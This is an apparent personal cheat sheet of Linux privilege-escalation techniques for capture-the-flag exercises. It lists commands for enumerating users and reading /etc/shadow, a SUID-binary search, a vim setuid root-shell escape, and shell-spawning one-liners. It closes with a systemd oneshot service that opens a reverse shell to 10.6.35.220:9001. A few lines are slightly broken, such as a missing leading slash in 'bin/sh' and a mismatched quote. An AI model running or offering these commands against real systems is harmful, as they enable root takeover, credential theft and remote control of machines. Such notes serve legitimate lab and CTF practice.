# user enum
`whoami`
`id`
`sudo -l`
`cat /etc/passwd | cut -d : -f 1`
`cat /etc/shadow`
`cat /etc/group`
`history`

### first steps
#### locate bins with root privileges
```bash
find / -perm -u=s -type f 2>/dev/null
```
Then look up shit on [[sites#GTFObins]]

##### common CTF binaries
###### vim
```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")’
```
Going to want to [[stabilize the shell]] with some technique

**Some examples:**

```bash 
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
#perl
perl -e 'exec "bin/sh";' 

#bash
/bin/sh -i

#ruby
ruby: exec "bin/sh"

#Lua
lua: os.execute('/bin/sh')

#AWK
awk 'BEGIN {system("/bin/sh")}'

#Find
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

#Find
Exec find . -exec /bin/sh \; -quit
```

 CTRL + Z
```bash
stty raw -echo; fg
export TERM=xterm-256color
```

##### common CTF avenues
###### oneshot services
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "sh -i >& /dev/tcp/10.6.35.220/9001 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```
